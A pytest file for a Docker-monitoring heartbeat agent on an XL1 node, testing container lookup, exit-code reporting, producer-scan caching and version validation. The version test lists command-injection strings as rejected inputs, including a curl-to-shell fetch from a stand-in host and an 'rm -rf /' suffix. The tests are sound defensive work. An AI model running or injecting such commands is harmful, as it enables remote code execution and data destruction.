"""Tests for the node heartbeat agent.

No Docker required -- `run()` is stubbed with real `docker ps` output.
Run with:  pytest pi-agent/test_xl1_heartbeat.py
"""

import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).parent))

import xl1_heartbeat as agent  # noqa: E402


# Real output from the Pi on 2026-08-22, when the tag had moved off the
# running producer and it showed as a bare image ID.
PS_FULL = (
    "xl1-service-xl1-service-1\txl1-service:local\tnpx tsx src/server.ts\n"
    "charming_einstein\t3a27a9e5f10d\tnode /opt/xl1/lib/entrypoint.mjs\n"
)


def _stub_run(monkeypatch, responses):
    """responses: list of (match_substring, return_value), first match wins."""
    def fake_run(args, timeout=10):
        joined = " ".join(args)
        for needle, value in responses:
            if needle in joined:
                return value
        return None
    monkeypatch.setattr(agent, "run", fake_run)


@pytest.fixture(autouse=True)
def _defaults(monkeypatch):
    monkeypatch.setattr(agent, "CONTAINER", "")
    monkeypatch.setattr(agent, "CONTAINER_IMAGE", "xl1:local")
    monkeypatch.setattr(agent, "COMMAND_HINT", "/opt/xl1/")


def test_finds_container_by_image_tag(monkeypatch):
    _stub_run(monkeypatch, [("ancestor=xl1:local", "charming_einstein")])
    assert agent.find_container() == "charming_einstein"


def test_finds_running_container_after_the_image_tag_moved(monkeypatch):
    """The regression: healthy node reported as missing.

    `ancestor=` resolves the tag to an image ID. Once the tag moved off the
    running container, the filter returned nothing and the agent declared a
    perfectly healthy producer missing.
    """
    _stub_run(monkeypatch, [
        ("ancestor=xl1:local", ""),   # tag no longer matches
        ("docker ps", PS_FULL),
    ])
    assert agent.find_container() == "charming_einstein"


def test_does_not_mistake_the_sidecar_service_for_the_node(monkeypatch):
    """xl1-service runs beside the node and must never be picked up."""
    only_sidecar = "xl1-service-xl1-service-1\txl1-service:local\tnpx tsx src/server.ts\n"
    _stub_run(monkeypatch, [("ancestor=xl1:local", ""), ("docker ps", only_sidecar)])
    assert agent.find_container() is None


def test_explicit_name_wins_and_is_verified(monkeypatch):
    monkeypatch.setattr(agent, "CONTAINER", "my-node")
    _stub_run(monkeypatch, [("docker inspect", "abc123")])
    assert agent.find_container() == "my-node"


def test_explicit_name_that_does_not_exist_is_not_invented(monkeypatch):
    monkeypatch.setattr(agent, "CONTAINER", "gone")
    _stub_run(monkeypatch, [])
    assert agent.find_container() is None


def test_no_containers_at_all(monkeypatch):
    _stub_run(monkeypatch, [])
    assert agent.find_container() is None


def test_missing_container_is_reported_not_silently_dropped(monkeypatch):
    _stub_run(monkeypatch, [])
    monkeypatch.setattr(agent, "HEIGHT_URL", "")
    payload = agent.collect()
    assert payload["container_status"] == "missing"
    assert payload["live"] is False


def test_zero_byte_memory_is_reported_as_unavailable(monkeypatch):
    """Pi OS disables the memory cgroup; docker reports 0B, not real zero."""
    _stub_run(monkeypatch, [("docker stats", "0.02%|0B / 3.707GiB")])
    assert agent.container_stats("x")["mem_used_mb"] is None


def test_real_memory_is_parsed(monkeypatch):
    _stub_run(monkeypatch, [("docker stats", "1.50%|412.3MiB / 3.707GiB")])
    stats = agent.container_stats("x")
    assert stats["mem_used_mb"] == 412.3
    assert stats["cpu_percent"] == 1.5


@pytest.mark.parametrize("value,expected", [
    ("0B", 0.0), ("900KiB", 0.9), ("412.3MiB", 412.3),
    ("1.5GiB", 1536.0), ("bogus", None), ("", None),
])
def test_memory_unit_parsing(value, expected):
    assert agent._to_mb(value) == expected


# --- reporting why a container is down --------------------------------------

RUNNING = "running|2026-08-22T13:21:00.9Z|0|xl1:local|0|0001-01-01T00:00:00Z||healthy"
EXITED_CONFIG = "exited|2026-08-20T09:15:00.1Z|0|xl1:local|78|2026-08-20T09:15:04.2Z||"
EXITED_OOM = "exited|2026-08-20T09:15:00.1Z|3|xl1:local|137|2026-08-20T09:20:00.0Z||"


def test_running_container_reports_no_exit_noise(monkeypatch):
    _stub_run(monkeypatch, [("docker inspect", RUNNING)])
    info = agent.container_info("x")
    assert info["container_status"] == "running"
    assert "exit_code" not in info      # 0 here would read as a clean exit
    assert "exited_at" not in info


def test_config_error_exit_is_reported(monkeypatch):
    """Exit 78 is EX_CONFIG -- it failed to start, it did not crash."""
    _stub_run(monkeypatch, [("docker inspect", EXITED_CONFIG)])
    info = agent.container_info("xyo-block-producer")
    assert info["container_status"] == "exited"
    assert info["exit_code"] == 78
    assert info["exited_at"] == "2026-08-20T09:15:04.2Z"


def test_oom_exit_is_distinguishable_from_config_error(monkeypatch):
    _stub_run(monkeypatch, [("docker inspect", EXITED_OOM)])
    info = agent.container_info("x")
    assert info["exit_code"] == 137
    assert info["restart_count"] == 3


def test_named_container_is_tracked_even_while_stopped(monkeypatch):
    """A monitored container that exists but is stopped must still be found.

    Otherwise it reports as 'missing' -- indistinguishable from having been
    deleted, when what you need to know is that it died and why.
    """
    monkeypatch.setattr(agent, "CONTAINER", "xyo-block-producer")
    _stub_run(monkeypatch, [("docker inspect", "sha256:abc")])
    assert agent.find_container() == "xyo-block-producer"


def test_container_error_is_captured(monkeypatch):
    with_error = "exited|2026-08-20T09:15:00Z|0|xl1:local|78|2026-08-20T09:15:04Z|invalid config key|"
    _stub_run(monkeypatch, [("docker inspect", with_error)])
    assert agent.container_info("x")["container_error"] == "invalid config key"


# --- duplicate node containers ----------------------------------------------

PS_TWO_NODES = (
    "keen_bassi\txl1:local\tnode /opt/xl1/lib/entrypoint.mjs\n"
    "xl1-service-xl1-service-1\txl1-service:local\tdocker-entrypoint.sh\n"
    "charming_einstein\t3a27a9e5f10d\tnode /opt/xl1/lib/entrypoint.mjs\n"
)


def test_lists_every_running_node_container(monkeypatch):
    """Real state from the Pi: a rebuild left two node containers running."""
    _stub_run(monkeypatch, [("docker ps", PS_TWO_NODES)])
    assert agent.list_node_containers() == ["keen_bassi", "charming_einstein"]


def test_sidecar_is_not_counted_as_a_node(monkeypatch):
    _stub_run(monkeypatch, [("docker ps", PS_TWO_NODES)])
    assert "xl1-service-xl1-service-1" not in agent.list_node_containers()


def test_tagged_container_is_preferred_when_several_run(monkeypatch):
    _stub_run(monkeypatch, [
        ("ancestor=xl1:local", "keen_bassi"),
        ("docker ps", PS_TWO_NODES),
    ])
    assert agent.find_container() == "keen_bassi"


# --- docker health state ----------------------------------------------------

def test_health_status_is_captured(monkeypatch):
    raw = "running|2026-08-22T13:21:00Z|0|xl1:local|0|0001-01-01T00:00:00Z||starting"
    _stub_run(monkeypatch, [("docker inspect", raw)])
    assert agent.container_info("x")["health_status"] == "starting"


def test_container_without_a_healthcheck_omits_the_field(monkeypatch):
    raw = "running|2026-08-22T13:21:00Z|0|xl1:local|0|0001-01-01T00:00:00Z||"
    _stub_run(monkeypatch, [("docker inspect", raw)])
    assert "health_status" not in agent.container_info("x")


def test_new_container_name_after_restart_is_found_by_image(monkeypatch):
    """Restarting produces a fresh random name; the image tag does not change."""
    _stub_run(monkeypatch, [("ancestor=xl1:local", "goofy_goldstine")])
    assert agent.find_container() == "goofy_goldstine"


# --- stopped containers must still be identifiable --------------------------

def test_stopped_container_is_found_so_its_exit_code_can_be_reported(monkeypatch):
    """`docker ps` lists running containers only.

    Without an `-a` fallback a stopped node reports as "missing", which is
    indistinguishable from deleted -- and loses the exit code, which is the
    whole point of noticing it stopped.
    """
    # "docker ps -a" first: first match wins, and the broader "docker ps"
    # needle would otherwise swallow the -a call too.
    _stub_run(monkeypatch, [
        ("docker ps -a", "xl1-producer"),             # stopped, still there
        ("docker ps", ""),                            # nothing running
    ])
    assert agent.find_container() == "xl1-producer"


def test_stopped_lookup_ignores_unrelated_containers(monkeypatch):
    """xyo-block-producer runs a different image and sits at exit 78.

    Matching it would report a two-day-old exit code as if it were current.
    """
    def fake_run(args, timeout=10):
        joined = " ".join(args)
        if "-a" in args and "ancestor=xl1:local" in joined:
            return ""            # no stopped container of OUR image
        return ""
    monkeypatch.setattr(agent, "run", fake_run)
    assert agent.find_container() is None


def test_running_container_still_wins_over_stopped(monkeypatch):
    _stub_run(monkeypatch, [
        ("ancestor=xl1:local", "xl1-producer"),
        ("docker ps -a", "old-dead-container"),
    ])
    assert agent.find_container() == "xl1-producer"


# --- producer scans are reported once, not replayed -------------------------

def test_producer_scan_is_not_resent_between_cycles(monkeypatch):
    """Re-sending a counted range on every heartbeat is ~30 rejected payloads
    per cycle, and it delays the state changes it is meant to drive."""
    calls = []

    def fake_request(address, params):
        calls.append(params)
        return {"fromBlock": 1, "toBlock": 100, "produced": 2}

    monkeypatch.setattr(agent, "_producer_request", fake_request)
    monkeypatch.setattr(agent, "read_reward_address", lambda _n: "a" * 40)
    monkeypatch.setattr(agent, "PRODUCER_URL", "http://127.0.0.1:8090/producer")
    agent._producer_cache["at"] = 0.0
    agent._producer_cache["value"] = None
    agent._producer_cursor["known"] = True     # backend already heard from

    first = agent.fetch_producer_stats("node")
    second = agent.fetch_producer_stats("node")
    third = agent.fetch_producer_stats("node")

    assert first is not None          # scanned
    assert second is None             # within the interval: nothing new
    assert third is None
    assert len(calls) == 1            # and the service was only asked once


# --- a silent no-op is the hardest fault to notice --------------------------

def _reward_env(monkeypatch, value):
    monkeypatch.setattr(agent, "REWARD_ADDRESS", "")
    monkeypatch.setattr(agent, "run", lambda *_a, **_k:
                        "XL1_NETWORK=sequence\nXL1_REWARD_ADDRESS=%s\nXL1_MNEMONIC=secret words" % value)
    agent._warned.clear()


def test_reward_address_read_from_container(monkeypatch):
    _reward_env(monkeypatch, "0000000000000000000000000000000000000abc")
    assert agent.read_reward_address("node") == "0000000000000000000000000000000000000abc"


def test_quoted_reward_address_is_accepted(monkeypatch):
    """docker --env-file does not strip quotes; a quoted value must still work."""
    _reward_env(monkeypatch, '"0x0000000000000000000000000000000000000abc"')
    assert agent.read_reward_address("node") == "0x0000000000000000000000000000000000000abc"


def test_missing_reward_address_warns_rather_than_failing_silently(monkeypatch, capsys):
    monkeypatch.setattr(agent, "REWARD_ADDRESS", "")
    monkeypatch.setattr(agent, "run", lambda *_a, **_k: "XL1_NETWORK=sequence")
    agent._warned.clear()
    assert agent.read_reward_address("node") is None
    assert "XL1_REWARD_ADDRESS not found" in capsys.readouterr().err


def test_malformed_reward_address_warns(monkeypatch, capsys):
    _reward_env(monkeypatch, "not-an-address")
    assert agent.read_reward_address("node") is None
    assert "not a 20-byte address" in capsys.readouterr().err


def test_warning_is_not_repeated_every_thirty_seconds(monkeypatch, capsys):
    """Once per fault, not 2,880 times a day."""
    monkeypatch.setattr(agent, "REWARD_ADDRESS", "")
    monkeypatch.setattr(agent, "run", lambda *_a, **_k: "XL1_NETWORK=sequence")
    agent._warned.clear()
    for _ in range(5):
        agent.read_reward_address("node")
    assert capsys.readouterr().err.count("XL1_REWARD_ADDRESS not found") == 1


def test_mnemonic_is_never_returned_or_logged(monkeypatch, capsys):
    """The mnemonic sits in the same environment block."""
    _reward_env(monkeypatch, "0000000000000000000000000000000000000abc")
    result = agent.read_reward_address("node")
    out = capsys.readouterr()
    assert "secret words" not in str(result)
    assert "secret words" not in out.err + out.out


# --- a restarted agent must not scan blind ----------------------------------

def _producer_ready(monkeypatch, calls):
    monkeypatch.setattr(agent, "PRODUCER_URL", "http://127.0.0.1:8090/producer")
    monkeypatch.setattr(agent, "read_reward_address", lambda _n: "a" * 40)
    monkeypatch.setattr(agent, "_producer_request",
                        lambda addr, params: calls.append(params) or
                        {"fromBlock": 1, "toBlock": 100, "produced": 1})
    agent._producer_cache["at"] = 0.0
    agent._producer_cache["value"] = None
    agent._producer_cursor.update({"block": None, "backfill": None,
                                   "backfill_done": False, "known": False})


def test_no_scan_before_the_backend_has_been_heard_from(monkeypatch):
    """After a restart the cursor is unknown; a guessed range overlaps
    already-counted blocks, is rejected, and burns a 15 minute cycle."""
    calls = []
    _producer_ready(monkeypatch, calls)
    assert agent.fetch_producer_stats("node") is None
    assert calls == []                      # nothing was even requested


def test_scans_once_the_cursor_is_known(monkeypatch):
    calls = []
    _producer_ready(monkeypatch, calls)
    agent._producer_cursor["known"] = True
    agent._producer_cursor["block"] = 565380
    assert agent.fetch_producer_stats("node") is not None
    assert calls[0]["since"] == 565380      # incremental, not a blind window


def test_a_brand_new_node_still_seeds_with_a_window(monkeypatch):
    """known=True with no cursor means the backend has counted nothing yet."""
    calls = []
    _producer_ready(monkeypatch, calls)
    agent._producer_cursor["known"] = True
    assert agent.fetch_producer_stats("node") is not None
    assert "since" not in calls[0]
    assert calls[0]["window"] == agent.PRODUCER_WINDOW


# --- version strings come from outside and are size-capped downstream -------

@pytest.mark.parametrize("value", ["5.2.2", "5.2.2-rc.1", "1.0", "10.20.30.40"])
def test_plausible_versions_accepted(value):
    assert agent._valid_version(value)


@pytest.mark.parametrize("value", [
    "x" * 40,                       # exceeds the backend's 32-char cap
    '5.2.2" && curl evil.sh | sh',  # quote-escape attempt
    "5.2.2; rm -rf /",
    "$(whoami)",
    "", None, 522, "latest",
])
def test_implausible_versions_rejected(value):
    assert not agent._valid_version(value)


def test_over_long_registry_version_is_dropped_not_forwarded(monkeypatch, capsys):
    """A 40-char version would fail the backend's max_length and 422 the whole
    heartbeat -- the node would read OFFLINE and alert, over bad metadata."""
    import io as _io, json as _json

    class _Resp:
        status = 200
        def read(self): return _json.dumps({"version": "x" * 40}).encode()
        def __enter__(self): return self
        def __exit__(self, *a): return False

    monkeypatch.setattr(agent.urllib.request, "urlopen", lambda *a, **k: _Resp())
    agent._cli_cache.update({"latest": None, "latest_at": 0.0})
    agent._warned.clear()
    assert agent.fetch_cli_latest() is None
    assert "implausible version" in capsys.readouterr().err
